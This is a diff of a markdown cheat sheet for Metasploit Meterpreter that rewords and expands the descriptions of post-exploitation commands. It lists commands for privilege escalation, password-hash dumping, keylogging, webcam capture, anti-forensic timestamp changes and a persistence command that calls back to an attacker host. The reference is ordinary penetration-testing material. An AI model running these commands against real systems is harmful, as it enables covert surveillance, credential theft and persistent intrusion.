@@ -1,57 +1,58 @@
-# Metasploit meterpreter
+# Metasploit Meterpreter
+
 ## Basic Commands
 
--   `help`: Display a list of available commands
--   `sysinfo`: Display system information, including OS and hostname
--   `ps`: List running processes
--   `kill`: Kill a process by PID
--   `migrate`: Migrate meterpreter to a new process
--   `rev2self`: Revert the current process to its original state
+- **help**: Show available meterpreter commands
+- **sysinfo**: Display system information (OS, hostname, architecture)
+- **ps**: List running processes (PID, name, user)
+- **kill** : Terminate a process by PID
+- **migrate** : Move meterpreter to another process (often a more stable one)
+- **rev2self**: Revert the current process to its original user context
 
 ## File System Commands
 
--   `ls`: List files in the current directory
--   `cd`: Change the current directory
--   `pwd`: Display the current directory
--   `cat`: Display the contents of a file
--   `download`: Download a file from the target system
--   `upload`: Upload a file to the target system
+- **ls**: List files in the current directory
+- **cd** : Change the current directory to `<path>`
+- **pwd**: Show the current directory path
+- **cat** : Display the contents of `<file>`
+- **download** : Download `<file>` from the target
+- **upload** : Upload `<file>` from local to the target
 
 ## Network Commands
 
--   `ipconfig`: Display network configuration information
--   `route`: Display the routing table
--   `netstat`: Display active network connections
--   `portfwd`: Forward a local port to a remote service
--   `getsockname`: Display the socket name for a given connection
+- **ipconfig**: Show network adapter configuration
+- **route**: View or modify the routing table
+- **netstat**: View active network connections
+- **portfwd**: Forward a local port to a remote service (`portfwd add -l <localport> -p <remoteport> -r <targetIP>`)
+- **getsockname**: Display the socket name for the active connection
 
 ## User Management Commands
 
--   `getuid`: Display the user ID of the current user
--   `ps`: List running processes and their owner
--   `getprivs`: Display the privileges of the current user
--   `getsystem`: Attempt to escalate privileges to SYSTEM level
+- **getuid**: Show the current user ID
+- **ps**: List running processes with user ownership
+- **getprivs**: List the current user’s privileges
+- **getsystem**: Attempt privilege escalation to SYSTEM
 
 ## Persistence Commands
 
--   `persistence`: Enable meterpreter persistence on the target system
--   `run`: Execute a script or command on startup
+- **persistence**: Enable persistent meterpreter access on the target
+- **run** : Execute a script (e.g., `run persistence -U -i <interval> -p <port> -r <host>`)
 
 ## Shell Commands
 
--   `shell`: Open a command prompt on the target system
--   `execute`: Execute a command on the target system
--   `background`: Background the current session
--   `Ctrl+Z`: Suspend the current session
+- **shell**: Open a command shell on the target
+- **execute -f** : Run a command on the target
+- **background**: Background the current meterpreter session
+- **Ctrl+Z**: Suspend/Background the current session in console mode
 
 ## Other Commands
 
--   `use`: Load a meterpreter extension
--   `run`: Execute a script or command within an extension
--   `keyscan_start`: Start logging keystrokes on the target system
--   `keyscan_dump`: Dump the logged keystrokes
--   `screenshot`: Take a screenshot of the desktop on the target system
--   `webcam_list`: List available webcams on the target system
--   `webcam_snap`: Take a snapshot from a webcam on the target system
--   `hashdump`: Dump the password hashes from the target system
--   `timestomp`: Modify the timestamp of a file on the target system
+- **use** : Load a meterpreter extension
+- **run** : Execute a script or extension command
+- **keyscan_start**: Start capturing keystrokes on the target
+- **keyscan_dump**: Display captured keystrokes
+- **screenshot**: Take a screenshot of the target’s desktop
+- **webcam_list**: List available webcams on the target
+- **webcam_snap**: Capture a snapshot from a webcam
+- **hashdump**: Dump local password hashes on the target
+- **timestomp**: Alter file timestamps on the target to evade detection
